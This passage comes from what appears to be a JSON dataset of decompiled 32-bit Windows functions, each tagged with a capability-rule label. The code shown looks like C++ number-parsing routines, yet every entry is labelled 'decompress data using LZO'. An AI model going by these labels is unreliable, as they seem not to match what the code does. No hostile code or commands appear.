        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046a110(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong uVar14;\n    int32_t var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint8_t var_33h;\n    uint8_t var_32h;\n    uint8_t var_31h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar8 = arg_18h;\n    iVar5 = fcn.0044da00(arg_18h + 0x6c);\n    uVar6 = *(iVar8 + 0xc) & 0x4a;\n    if (uVar6 == 0x40) {\n        var_40h = 8;\ncode_r0x0046a14f:\n        var_32h = fcn.004502d0(&arg_10h);\n        if (var_32h == 0) {\ncode_r0x0046a16e:\n            var_48h = &arg_10h;\n            uVar7 = fcn.004503c0();\n            cVar4 = uVar7;\n            bVar13 = *(iVar5 + 0x4a) == cVar4;\n            if (bVar13) {\n                cVar10 = *(iVar5 + 0x10);\ncode_r0x0046a19e:\n                if (((cVar10 != '\\0') && (*(iVar5 + 0x25) == cVar4)) || (*(iVar5 + 0x24) == cVar4))\n                goto code_r0x0046a5d7;\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                var_32h = fcn.004502d0(var_48h);\n                var_38h = 0;\n                var_31h = false;\n                if (var_32h == 0) {\n                    uVar7 = fcn.004503c0();\n                    cVar10 = *(iVar5 + 0x10);\n                    goto code_r0x0046a5d7;\n                }\n            }\n            else {\n                cVar10 = *(iVar5 + 0x10);\n                if (*(iVar5 + 0x4b) == cVar4) goto code_r0x0046a19e;\ncode_r0x0046a5d7:\n                var_38h = 0;\n                var_31h = false;\n                while (((cVar4 = uVar7,  cVar10 == '\\0' || (*(iVar5 + 0x25) != cVar4)) && (*(iVar5 + 0x24) != cVar4))) {\n                    if (*(iVar5 + 0x4e) == cVar4) {\n                        var_31h = var_40h == 10 | var_31h ^ 1;\n                        if (var_31h == false) goto code_r0x0046a61f;\n                        bVar3 = uVar6 == 0 || var_40h == 8;\n                        if (uVar6 != 0 && var_40h != 8) {\n                            var_38h = var_38h + 1;\n                            goto code_r0x0046a653;\n                        }\n                        var_38h = 0;\n                        var_40h = 8;\n                        uVar11 = arg_8h[2];\n                        var_31h = bVar3;\n                        if (arg_8h[3] <= uVar11) {\n                            var_40h = 8;\n                            goto code_r0x0046a700;\n                        }\ncode_r0x0046a662:\n                        arg_8h[2] = uVar11 + 1;\ncode_r0x0046a66f:\n                        var_40h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar8 = (**(*arg_8h + 0x24))(),  iVar8 == -1)) {\n                            arg_8h = NULL;\n                            var_40h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (var_31h == false) break;\ncode_r0x0046a61f:\n                        if ((*(iVar5 + 0x4c) != cVar4) && (*(iVar5 + 0x4d) != cVar4)) {\n                            var_32h = 0;\n                            var_31h = true;\n                            goto code_r0x0046a1f0;\n                        }\n                        var_32h = var_40h == 0x10 || uVar6 == 0;\n                        if (var_40h != 0x10 && uVar6 != 0) {\n                            var_31h = true;\n                            goto code_r0x0046a1fc;\n                        }\n                        var_38h = 0;\n                        var_40h = 0x10;\n                        var_31h = false;\ncode_r0x0046a653:\n                        uVar11 = arg_8h[2];\n                        if (uVar11 < arg_8h[3]) goto code_r0x0046a662;\ncode_r0x0046a700:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046a66f;\n                        var_40h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar3 = arg_10h != NULL && arg_14h == -1;\n                    var_33h = arg_14h == -1;\n                    if ((bVar3) && (var_33h = false,  arg_10h[3] <= arg_10h[2])) {\n                        var_33h = false;\n                        iVar8 = (**(*arg_10h + 0x24))();\n                        if (iVar8 == -1) {\n                            arg_10h = NULL;\n                            var_33h = bVar3;\n                        }\n                    }\n                    if (var_33h == var_40h._0_1_) {\n                        var_32h = 1;\n                        goto code_r0x0046a1f0;\n                    }\n                    uVar7 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar7 = *arg_8h[2];\n                        }\n                        else {\n                            uVar7 = (**(*arg_8h + 0x24))();\n                            if (uVar7 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar7 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (var_31h == false) break;\n                    cVar10 = *(iVar5 + 0x10);\n                }\n                var_32h = 0;\n            }\ncode_r0x0046a1f0:\n            var_44h = 0x16;\n            if (var_40h != 0x10) goto code_r0x0046a1fc;\n        }\n        else {\n            uVar7 = 0;\n            var_38h = 0;\n            var_31h = false;\n            bVar13 = false;\ncode_r0x0046a1fc:\n            var_44h = var_40h;\n        }\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        if (*(iVar5 + 0x10) != '\\0') {\ncode_r0x0046a900:\n            fcn.0048c930(0x20);\n        }\n        uVar1 = var_32h;\n        var_48h = &arg_10h;\n        var_58h = 0;\n        var_54h = -0x80000000;\n        if (!bVar13) {\n            var_58h = 0xffffffff;\n            var_54h = 0x7fffffff;\n        }\n        uVar14 = fcn.00437f00(var_58h, var_54h, var_40h, 0);\n        uVar6 = uVar14 >> 0x20;\n        var_33h = *(iVar5 + 100);\n        if (var_33h == 0) {\n            if (var_32h == 0) {\n                var_33h = var_32h;\n                uVar11 = 0;\n                uVar12 = 0;\n                do {\n                    cVar4 = uVar7;\n                    iVar8 = cVar4;\n                    if (var_44h < 0xb) {\n                        if ((cVar4 < '0') || (var_44h + '0' <= cVar4)) goto code_r0x0046a780;\ncode_r0x0046a2cf:\n                        uVar7 = iVar8 - 0x30;\n                    }\n                    else {\n                        if (cVar4 - 0x30U < 10) goto code_r0x0046a2cf;\n                        uVar7 = iVar8 - 0x57;\n                        if (5 < cVar4 + 0x9fU) {\n                            if (5 < cVar4 + 0xbfU) goto code_r0x0046a780;\n                            uVar7 = iVar8 - 0x37;\n                        }\n                    }\n                    if (uVar7 == 0xffffffff) goto code_r0x0046a780;\n                    if (uVar6 < uVar12 || uVar6 - uVar12 < (uVar14 < uVar11)) {\n                        var_33h = 1;\n                        uVar7 = arg_8h[2];\n                        if (arg_8h[3] <= uVar7) goto code_r0x0046a835;\ncode_r0x0046a332:\n                        arg_8h[2] = uVar7 + 1;\n                    }\n                    else {\n                        uVar9 = uVar11 * var_40h;\n                        uVar12 = (uVar11 * var_40h >> 0x20) + var_40h * uVar12;\n                        uVar11 = (var_54h - (uVar7 >> 0x1f)) - (var_58h < uVar7);\n                        var_33h = var_33h | (uVar11 < uVar12 || uVar11 - uVar12 < (var_58h - uVar7 < uVar9));\n                        uVar11 = uVar9 + uVar7;\n                        uVar12 = uVar12 + (uVar7 >> 0x1f) + CARRY4(uVar9, uVar7);\n                        var_38h = var_38h + 1;\n                        uVar7 = arg_8h[2];\n                        if (uVar7 < arg_8h[3]) goto code_r0x0046a332;\ncode_r0x0046a835:\n                        (**(*arg_8h + 0x28))();\n                    }\n                    arg_ch = 0xffffffff;\n                    uVar1 = fcn.004502d0(var_48h);\n                    if (uVar1 != 0) goto code_r0x0046a35a;\n                    uVar7 = fcn.004503c0();\n                } while( true );\n            }\n            uVar11 = 0;\n            var_32h = 0;\n            uVar12 = 0;\n            goto code_r0x0046a35a;\n        }\ncode_r0x0046a483:\n        uVar1 = var_32h;\n        var_50h = uVar14 >> 0x20;\n        var_4ch = uVar14;\n        var_48h = &arg_10h;\n        if (var_32h != 0) {\n            uVar11 = 0;\n            uVar12 = 0;\n            var_33h = 0;\n            var_32h = 0;\n            goto code_r0x0046a35a;\n        }\n        var_33h = 0;\n        uVar11 = 0;\n        uVar12 = 0;\n        uVar2 = *(iVar5 + 0x10);\n        if ((uVar2 != 0) && (*(iVar5 + 0x25) == uVar7)) goto code_r0x0046a58e;\ncode_r0x0046a4b2:\n        if ((uVar7 != *(iVar5 + 0x24)) && (iVar8 = sub.msvcrt.dll_memchr(iVar5 + 0x4e, uVar7, var_44h),  iVar8 != 0)) {\n            uVar6 = iVar8 - (iVar5 + 0x4e);\n            if (0xf < uVar6) {\n                uVar6 = uVar6 - 6;\n            }\n            if (var_50h < uVar12 || var_50h - uVar12 < (var_4ch < uVar11)) {\n                var_33h = 1;\n            }\n            else {\n                uVar7 = uVar11 * var_40h;\n                uVar12 = (uVar11 * var_40h >> 0x20) + var_40h * uVar12;\n                uVar11 = (var_54h - (uVar6 >> 0x1f)) - (var_58h < uVar6);\n                var_33h = var_33h | (uVar11 < uVar12 || uVar11 - uVar12 < (var_58h - uVar6 < uVar7));\n                uVar11 = uVar7 + uVar6;\n                uVar12 = uVar12 + (uVar6 >> 0x1f) + CARRY4(uVar7, uVar6);\n                var_38h = var_38h + 1;\n            }\n            uVar6 = arg_8h[2];\n            if (arg_8h[3] <= uVar6) goto code_r0x0046a5bc;\n            do {\n                arg_8h[2] = uVar6 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    uVar1 = fcn.004502d0(var_48h);\n                    if (uVar1 != 0) goto code_r0x0046a35a;\n                    uVar7 = fcn.004503c0();\n                    uVar2 = *(iVar5 + 0x10);\n                    if ((uVar2 == 0) || (*(iVar5 + 0x25) != uVar7)) goto code_r0x0046a4b2;\ncode_r0x0046a58e:\n                    if (var_38h == 0) {\n                        uVar1 = 0;\n                        var_32h = uVar2;\n                        goto code_r0x0046a35a;\n                    }\n                    fcn.0048cc10(var_38h);\n                    var_38h = 0;\n                    uVar6 = arg_8h[2];\n                    if (uVar6 < arg_8h[3]) break;\ncode_r0x0046a5bc:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x0046a780:\n        uVar1 = 0;\n        uVar2 = 0;\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x0046a790;\ncode_r0x0046a368:\n        if ((var_38h != 0) || (var_31h == 1)) {\ncode_r0x0046a7e1:\n            if (var_32h == 0) {\n                if (var_33h == 0) {\n                    if (bVar13) {\n                        bVar13 = uVar11 != 0;\n                        uVar11 = -uVar11;\n                        uVar12 = -(uVar12 + bVar13);\n                    }\n                    *arg_20h = uVar11;\n                    arg_20h[1] = uVar12;\n                }\n                else {\n                    uVar6 = 0;\n                    uVar7 = 0x80000000;\n                    if (!bVar13) {\n                        uVar6 = 0xffffffff;\n                        uVar7 = 0x7fffffff;\n                    }\n                    *arg_20h = uVar6;\n                    arg_20h[1] = uVar7;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x0046a396;\n            }\n        }\n    }\n    else {\n        var_40h = 10;\n        if (uVar6 != 8) goto code_r0x0046a14f;\n        var_40h = 0x10;\n        uVar1 = fcn.004502d0(&arg_10h);\n        if (uVar1 == 0) goto code_r0x0046a16e;\n        *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n        uVar2 = *(iVar5 + 0x10);\n        if (uVar2 != 0) {\n            var_38h = 0;\n            uVar7 = 0;\n            var_31h = false;\n            bVar13 = false;\n            var_44h = 0x16;\n            var_40h = 0x10;\n            var_32h = uVar2;\n            goto code_r0x0046a900;\n        }\n        var_32h = *(iVar5 + 100);\n        bVar13 = false;\n        if (var_32h != 0) {\n            var_44h = 0x16;\n            uVar7 = 0;\n            uVar14 = 0x7ffffffffffffff;\n            var_58h = 0xffffffff;\n            var_54h = 0x7fffffff;\n            var_38h = 0;\n            var_40h = 0x10;\n            var_31h = uVar2;\n            goto code_r0x0046a483;\n        }\n        uVar11 = 0;\n        uVar12 = 0;\n        var_33h = 0;\n        var_38h = 0;\n        var_31h = var_32h;\ncode_r0x0046a35a:\n        uVar2 = uVar1;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0046a368;\ncode_r0x0046a790:\n        uVar1 = uVar2;\n        fcn.0048cc10(var_38h);\n        cVar4 = fcn.004bdf60(*(iVar5 + 8), *(iVar5 + 0xc), &var_1eh + 2);\n        if (cVar4 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((var_38h != 0) || (var_31h == 1)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0046a7e1;\n    }\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0046a396:\n    var_60h = &var_1eh + 1;\n    if (uVar1 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(var_60h);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4610
    },
    "0046aa40": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046aa40(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint8_t var_3eh;\n    int32_t var_3dh;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar10 = arg_18h;\n    iVar6 = fcn.0044da00(arg_18h + 0x6c);\n    uVar7 = *(iVar10 + 0xc) & 0x4a;\n    if (uVar7 == 0x40) {\n        uVar13 = 8;\ncode_r0x0046aa7f:\n        var_3dh._0_1_ = fcn.004502d0(&arg_10h);\n        if (var_3dh == '\\0') {\ncode_r0x0046aa9e:\n            var_50h = &arg_10h;\n            uVar8 = fcn.004503c0();\n            cVar5 = uVar8;\n            bVar15 = *(iVar6 + 0x4a) == cVar5;\n            cVar3 = *(iVar6 + 0x10);\n            if ((((bVar15) || (*(iVar6 + 0x4b) == cVar5)) && ((cVar3 == '\\0' || (*(iVar6 + 0x25) != cVar5)))) &&\n               (*(iVar6 + 0x24) != cVar5)) {\n                fcn.004a5560();\n                arg_ch = 0xffffffff;\n                var_3dh._0_1_ = fcn.004502d0(var_50h);\n                stack0xffffffc0 = 0;\n                bVar14 = false;\n                if (var_3dh == '\\0') {\n                    uVar8 = fcn.004503c0();\n                    cVar3 = *(iVar6 + 0x10);\n                    goto code_r0x0046acf0;\n                }\n            }\n            else {\ncode_r0x0046acf0:\n                stack0xffffffc0 = 0;\n                bVar14 = false;\n                while (((cVar5 = uVar8,  cVar3 == '\\0' || (*(iVar6 + 0x25) != cVar5)) && (*(iVar6 + 0x24) != cVar5))) {\n                    if (*(iVar6 + 0x4e) == cVar5) {\n                        bVar4 = uVar13 == 10 | bVar14 ^ 1U;\n                        if (!bVar4) goto code_r0x0046ad39;\n                        bVar14 = uVar7 == 0 || uVar13 == 8;\n                        if (uVar7 != 0 && uVar13 != 8) {\n                            unique0x00007a80 = stack0xffffffc0 + 1;\n                            goto code_r0x0046ad6d;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar13 = 8;\n                        uVar9 = arg_8h[2];\n                        if (arg_8h[3] <= uVar9) goto code_r0x0046ae70;\ncode_r0x0046ad7c:\n                        arg_8h[2] = uVar9 + 1;\ncode_r0x0046ad89:\n                        var_38h._0_1_ = false;\n                        if ((arg_8h[3] <= arg_8h[2]) && (iVar10 = (**(*arg_8h + 0x24))(),  iVar10 == -1)) {\n                            arg_8h = NULL;\n                            var_38h._0_1_ = true;\n                        }\n                    }\n                    else {\n                        if (!bVar14) break;\ncode_r0x0046ad39:\n                        if ((*(iVar6 + 0x4c) != cVar5) && (*(iVar6 + 0x4d) != cVar5)) {\n                            var_3dh._0_1_ = '\\0';\n                            bVar14 = true;\n                            goto code_r0x0046ab10;\n                        }\n                        var_3dh._0_1_ = uVar13 == 0x10 || uVar7 == 0;\n                        if (uVar13 != 0x10 && uVar7 != 0) {\n                            bVar14 = true;\n                            goto code_r0x0046ab1c;\n                        }\n                        stack0xffffffc0 = 0;\n                        uVar13 = 0x10;\n                        bVar4 = false;\ncode_r0x0046ad6d:\n                        uVar9 = arg_8h[2];\n                        bVar14 = bVar4;\n                        if (uVar9 < arg_8h[3]) goto code_r0x0046ad7c;\ncode_r0x0046ae70:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046ad89;\n                        var_38h._0_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar4 = arg_10h != NULL && arg_14h == -1;\n                    var_4ch._0_1_ = arg_14h == -1;\n                    if ((bVar4) && (var_4ch._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar10 = (**(*arg_10h + 0x24))();\n                        var_4ch._0_1_ = false;\n                        if (iVar10 == -1) {\n                            arg_10h = NULL;\n                            var_4ch._0_1_ = bVar4;\n                        }\n                    }\n                    if (var_38h._0_1_ == var_4ch) {\n                        var_3dh._0_1_ = '\\x01';\n                        goto code_r0x0046ab10;\n                    }\n                    uVar8 = arg_ch;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar8 = *arg_8h[2];\n                        }\n                        else {\n                            uVar8 = (**(*arg_8h + 0x24))();\n                            if (uVar8 == 0xffffffff) {\n                                arg_8h = NULL;\n                                uVar8 = 0xffffffff;\n                            }\n                        }\n                    }\n                    if (!bVar14) break;\n                    cVar3 = *(iVar6 + 0x10);\n                }\n                var_3dh._0_1_ = '\\0';\n            }\ncode_r0x0046ab10:\n            var_4ch = 0x16;\n            if (uVar13 == 0x10) goto code_r0x0046ab1f;\n        }\n        else {\n            uVar8 = 0;\n            stack0xffffffc0 = 0;\n            bVar14 = false;\n            bVar15 = false;\n        }\ncode_r0x0046ab1c:\n        var_4ch = uVar13;\n    }\n    else {\n        uVar13 = 10;\n        if (uVar7 != 8) goto code_r0x0046aa7f;\n        uVar13 = 0x10;\n        var_3dh._0_1_ = fcn.004502d0(&arg_10h);\n        if (var_3dh == '\\0') goto code_r0x0046aa9e;\n        uVar8 = 0;\n        stack0xffffffc0 = 0;\n        uVar13 = 0x10;\n        bVar14 = false;\n        bVar15 = false;\n        var_4ch = 0x16;\n    }\ncode_r0x0046ab1f:\n    cVar3 = var_3dh;\n    var_50h = &arg_10h;\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar6 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar16 = fcn.00437f00(0xffffffff, 0xffffffff, uVar13, 0);\n    uVar7 = uVar16 >> 0x20;\n    uVar1 = *(iVar6 + 100);\n    if (uVar1 == 0) {\n        var_3eh = 0;\n        if (var_3dh == '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            do {\n                cVar3 = uVar8;\n                iVar10 = cVar3;\n                if (var_4ch < 0xb) {\n                    if ((cVar3 < '0') || (var_4ch + '0' <= cVar3)) goto code_r0x0046aee2;\ncode_r0x0046abd0:\n                    uVar8 = iVar10 - 0x30;\n                }\n                else {\n                    if (cVar3 - 0x30U < 10) goto code_r0x0046abd0;\n                    if (cVar3 + 0x9fU < 6) {\n                        uVar8 = iVar10 - 0x57;\n                    }\n                    else {\n                        if (5 < cVar3 + 0xbfU) goto code_r0x0046aee2;\n                        uVar8 = iVar10 - 0x37;\n                    }\n                }\n                if (uVar8 == 0xffffffff) goto code_r0x0046aee2;\n                if (uVar7 < var_34h || uVar7 - var_34h < (uVar16 < var_38h)) {\n                    var_3eh = 1;\n                    uVar8 = arg_8h[2];\n                    if (arg_8h[3] <= uVar8) goto code_r0x0046af93;\ncode_r0x0046ac3e:\n                    arg_8h[2] = uVar8 + 1;\n                }\n                else {\n                    uVar9 = var_38h * uVar13;\n                    uVar12 = (var_38h * uVar13 >> 0x20) + uVar13 * var_34h;\n                    uVar11 = ~(uVar8 >> 0x1f);\n                    var_3eh = var_3eh | (uVar11 < uVar12 || uVar11 - uVar12 < (~uVar8 < uVar9));\n                    var_38h = uVar8 + uVar9;\n                    var_34h = (uVar8 >> 0x1f) + uVar12 + CARRY4(uVar8, uVar9);\n                    uVar8 = arg_8h[2];\n                    unique0x00007a80 = stack0xffffffc0 + 1;\n                    if (uVar8 < arg_8h[3]) goto code_r0x0046ac3e;\ncode_r0x0046af93:\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                cVar3 = fcn.004502d0(var_50h);\n                if (cVar3 != '\\0') goto code_r0x0046ac66;\n                uVar8 = fcn.004503c0();\n            } while( true );\n        }\n        var_38h = 0;\n        var_3dh._0_1_ = '\\0';\n        var_34h = 0;\ncode_r0x0046ac66:\n        cVar5 = cVar3;\n        if (*(stack0xffffffe0 + -0xc) == 0) goto code_r0x0046ac74;\ncode_r0x0046aef2:\n        cVar3 = cVar5;\n        fcn.0048cc10(var_3dh._1_1_);\n        cVar5 = fcn.004bdf60(*(iVar6 + 8), *(iVar6 + 0xc), &var_1eh + 2);\n        if (cVar5 == '\\0') {\n            *arg_1ch = 4;\n        }\n        if (((stack0xffffffc0 != 0) || (bVar14)) || (*(stack0xffffffe0 + -0xc) != 0)) goto code_r0x0046af40;\n    }\n    else {\n        if (var_3dh != '\\0') {\n            var_38h = 0;\n            var_34h = 0;\n            var_3eh = 0;\n            var_3dh._0_1_ = '\\0';\n            goto code_r0x0046ac66;\n        }\n        var_3eh = 0;\n        cVar5 = *(iVar6 + 0x10);\n        var_38h = 0;\n        var_34h = 0;\n        if ((cVar5 != '\\0') && (*(iVar6 + 0x25) == uVar8)) goto code_r0x0046b14d;\ncode_r0x0046b065:\n        if ((uVar8 != *(iVar6 + 0x24)) && (iVar10 = sub.msvcrt.dll_memchr(iVar6 + 0x4e, uVar8, var_4ch),  iVar10 != 0))\n        {\n            uVar8 = iVar10 - (iVar6 + 0x4e);\n            if (0xf < uVar8) {\n                uVar8 = uVar8 - 6;\n            }\n            uVar2 = uVar1;\n            if (var_34h <= uVar7 && (uVar16 < var_38h) <= uVar7 - var_34h) {\n                uVar9 = var_38h * uVar13;\n                uVar12 = uVar13 * var_34h + (var_38h * uVar13 >> 0x20);\n                uVar11 = ~(uVar8 >> 0x1f);\n                var_38h = uVar8 + uVar9;\n                var_34h = (uVar8 >> 0x1f) + uVar12 + CARRY4(uVar8, uVar9);\n                unique0x00007a80 = stack0xffffffc0 + 1;\n                uVar2 = var_3eh | (uVar11 < uVar12 || uVar11 - uVar12 < (~uVar8 < uVar9));\n            }\n            var_3eh = uVar2;\n            uVar8 = arg_8h[2];\n            if (arg_8h[3] <= uVar8) goto code_r0x0046b17d;\n            do {\n                arg_8h[2] = uVar8 + 1;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar3 = fcn.004502d0(var_50h);\n                    if (cVar3 != '\\0') goto code_r0x0046ac66;\n                    uVar8 = fcn.004503c0();\n                    cVar5 = *(iVar6 + 0x10);\n                    if ((cVar5 == '\\0') || (*(iVar6 + 0x25) != uVar8)) goto code_r0x0046b065;\ncode_r0x0046b14d:\n                    if (stack0xffffffc0 == 0) {\n                        cVar3 = '\\0';\n                        var_3dh._0_1_ = cVar5;\n                        goto code_r0x0046ac66;\n                    }\n                    fcn.0048cc10(stack0xffffffc0);\n                    stack0xffffffc0 = 0;\n                    uVar8 = arg_8h[2];\n                    if (uVar8 < arg_8h[3]) break;\ncode_r0x0046b17d:\n                    (**(*arg_8h + 0x28))();\n                }\n            } while( true );\n        }\ncode_r0x0046aee2:\n        cVar3 = '\\0';\n        cVar5 = '\\0';\n        if (*(stack0xffffffe0 + -0xc) != 0) goto code_r0x0046aef2;\ncode_r0x0046ac74:\n        if ((stack0xffffffc0 != 0) || (bVar14)) {\ncode_r0x0046af40:\n            if (var_3dh == '\\0') {\n                if (var_3eh == 0) {\n                    if (bVar15) {\n                        bVar14 = var_38h != 0;\n                        var_38h = -var_38h;\n                        var_34h = -(var_34h + bVar14);\n                    }\n                    *arg_20h = var_38h;\n                    arg_20h[1] = var_34h;\n                }\n                else {\n                    *arg_20h = 0xffffffff;\n                    arg_20h[1] = 0xffffffff;\n                    *arg_1ch = 4;\n                }\n                goto code_r0x0046aca2;\n            }\n        }\n    }\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0046aca2:\n    if (cVar3 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0048b630(&var_1eh + 1);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 4132
    },
    "0046b2f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046b2f0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t arg_18h, uint *arg_1ch, int32_t *arg_20h\n            )\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint s;\n    int32_t var_38h;\n    uint var_31h;\n    uint var_2ch;\n    int32_t var_1eh;\n    uint var_ch;\n    \n    iVar4 = fcn.0044da00(arg_18h + 0x6c);\n    var_31h._0_1_ = fcn.004502d0(&arg_10h);\n    if (var_31h == 0) {\n        cVar3 = fcn.004503c0();\n        cVar2 = *(iVar4 + 0x10);\n        if ((((*(iVar4 + 0x4b) == cVar3) || (*(iVar4 + 0x4a) == cVar3)) &&\n            ((cVar2 == '\\0' || (*(iVar4 + 0x25) != cVar3)))) && (*(iVar4 + 0x24) != cVar3)) {\n            fcn.0048cc10((*(iVar4 + 0x4b) != cVar3) * '\\x02' + '+');\n            fcn.004a5560();\n            arg_ch = 0xffffffff;\n            var_31h._0_1_ = fcn.004502d0(&arg_10h);\n            var_38h = 0;\n            uVar10 = 0;\n            if (var_31h != 0) goto code_r0x0046b340;\n            cVar3 = fcn.004503c0();\n            cVar2 = *(iVar4 + 0x10);\n        }\n        uVar10 = 0;\n        var_38h = 0;\n        while ((((cVar2 == '\\0' || (*(iVar4 + 0x25) != cVar3)) && (*(iVar4 + 0x24) != cVar3)) &&\n               (*(iVar4 + 0x4e) == cVar3))) {\n            if (uVar10 == 0) {\n                fcn.0048cc10(0x30);\n                uVar6 = arg_8h[2];\n                if (uVar6 < arg_8h[3]) goto code_r0x0046b8a1;\ncode_r0x0046b8f0:\n                (**(*arg_8h + 0x28))();\n            }\n            else {\n                uVar6 = arg_8h[2];\n                if (arg_8h[3] <= uVar6) goto code_r0x0046b8f0;\ncode_r0x0046b8a1:\n                arg_8h[2] = uVar6 + 1;\n            }\n            var_38h = var_38h + 1;\n            arg_ch = 0xffffffff;\n            var_31h._0_1_ = fcn.004502d0(&arg_10h);\n            uVar10 = var_31h;\n            if (var_31h != 0) goto code_r0x0046b340;\n            cVar3 = fcn.004503c0();\n            cVar2 = *(iVar4 + 0x10);\n            uVar10 = 1;\n        }\n        var_31h._0_1_ = 0;\n    }\n    else {\n        cVar3 = '\\0';\n        var_38h = 0;\n        uVar10 = 0;\n    }\ncode_r0x0046b340:\n    *NULL = fcn.0048b140(0, 0, &var_1eh + 1);\n    if (*(iVar4 + 0x10) != '\\0') {\n        fcn.0048c930(0x20);\n    }\n    uVar11 = *(iVar4 + 100);\n    if (uVar11 == 0) {\n        if (var_31h == 0) {\n            uVar1 = 0;\ncode_r0x0046b4af:\n            if (9 < cVar3 - 0x30U) goto code_r0x0046b530;\ncode_r0x0046b4ba:\n            if (cVar3 + -0x30 == -1) goto code_r0x0046b530;\n            fcn.0048cc10(cVar3 + -0x30 + '0');\n            uVar11 = 1;\ncode_r0x0046b4db:\n            uVar6 = arg_8h[2];\n            uVar10 = uVar1;\n            if (arg_8h[3] <= uVar6) goto code_r0x0046b5e7;\n            do {\n                arg_8h[2] = uVar6 + 1;\n                uVar1 = uVar10;\n                uVar10 = uVar11;\n                while( true ) {\n                    arg_ch = 0xffffffff;\n                    cVar2 = fcn.004502d0(&arg_10h);\n                    if (cVar2 != '\\0') goto code_r0x0046b41c;\n                    cVar3 = fcn.004503c0();\n                    if (cVar3 - 0x30U < 10) goto code_r0x0046b4ba;\ncode_r0x0046b530:\n                    if ((*(iVar4 + 0x24) == cVar3) && ((var_31h | uVar1) == 0)) {\n                        fcn.0048cc10(0x2e);\n                        uVar1 = 0;\n                        var_31h._0_1_ = 1;\n                        uVar11 = uVar10;\n                        goto code_r0x0046b4db;\n                    }\n                    if (((*(iVar4 + 0x5c) != cVar3) && (*(iVar4 + 0x62) != cVar3)) ||\n                       (uVar10 = uVar10 & (uVar1 